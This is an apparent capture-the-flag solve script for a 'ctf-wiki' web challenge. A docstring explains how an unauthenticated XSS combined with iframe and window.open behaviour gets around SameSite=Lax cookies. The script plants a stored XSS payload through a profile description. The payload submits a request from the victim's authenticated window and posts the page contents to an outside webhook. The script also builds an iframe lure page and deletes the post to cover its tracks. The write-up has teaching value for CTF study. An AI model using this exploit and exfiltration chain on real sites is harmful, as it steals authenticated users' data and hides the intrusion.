#!/usr/bin/env python3
"""
The idea behind this challenge is to leverage an unauthenticated XSS to target parts of
the web application that require authentication. Typically, XSS payloads are very
powerful only when they are able to execute in the context of the victim's session,
however, this technique shows us that unauthenticated XSS can still be very powerful.
A key idea behind this is that inside iframes SameSite=None cookies are sent but
SameSite=Lax cookies are NOT. However, window.open loads BOTH SameSite=None and
SameSite=Lax cookies. Normally, if we tried to access data from cross frame or
cross window, we would be blocked by the Same-Origin Policy. However, if the site
loaded with window.open and within the iframe are within the same origin, then we
can access the data from the iframe. This is a key idea behind this challenge since
we now have a way to run our XSS payload within the unauthenticated context of the
iframe and then access the data from the authenticated context of the opened window.
This is particularly powerful since SameSite=Lax is commonly used to protect against
CSRF attacks, but in this case, introduces an authentication differential that we can
exploit.

This challenge was inspired by a Tweet from @kevin_mizu, another great CTF player that
should definitely be included in this CTF wiki.

https://x.com/kevin_mizu/status/1732819176425673173?s=46&t=Ce2VuB131zk0NttZle-dYw
"""
import requests

url = "https://ctf-wiki.chall.lac.tf"
# url = "http://localhost:1337"
webhook = "https://webhook.site/cc458d47-4062-45bd-ad82-8784f21a3288"

payload = f"""
<script>
let w = window.open('{url}/home');
w.document.write(`<form action="/flag" method="POST" id="flag-form"></form>`);
setTimeout(() => w.document.forms['flag-form'].submit(), 500);
setTimeout(() => fetch('{webhook}', {{ method: 'POST', mode: 'no-cors', body: JSON.stringify({{ content: w.document.body.innerHTML }})}}), 1500);
</script>
"""

session = requests.Session()

r = session.post(
    f"{url}/login", data={"username": "pbrucla", "password": "password123"}
)
assert r.status_code == 200
r = session.post(
    f"{url}/create",
    data={
        "name": "bliutech",
        "image": "https://media1.tenor.com/m/x8v1oNUOmg4AAAAd/rickroll-roll.gif",
        "team": "pbrucla",
        "specialty": "xss",
        "website": "https://pbr.uclaacm.com",
        "description": payload,
    },
)
assert r.status_code == 200

payload_url = r.url.replace("/edit/", "/view/")

leak = f"""
<!DOCTYPE html>
<html>
<head>
    <title>PBR | UCLA</title> 
</head>
<body>
    <iframe src="{payload_url}"></iframe>
</body>
</html>
"""

print("Created post:", payload_url)

with open("solve.html", "w") as f:
    f.write(leak)

print(
    f"Deploy solve.html on a server and open it in your browser. The flag will be sent to your webhook, {webhook}."
)

breakpoint()

# Delete the post to cover our tracks. :D

delete_url = payload_url.replace("/view/", "/delete/")

r = session.delete(delete_url)
assert r.status_code == 200

print("Deleted post:", delete_url)
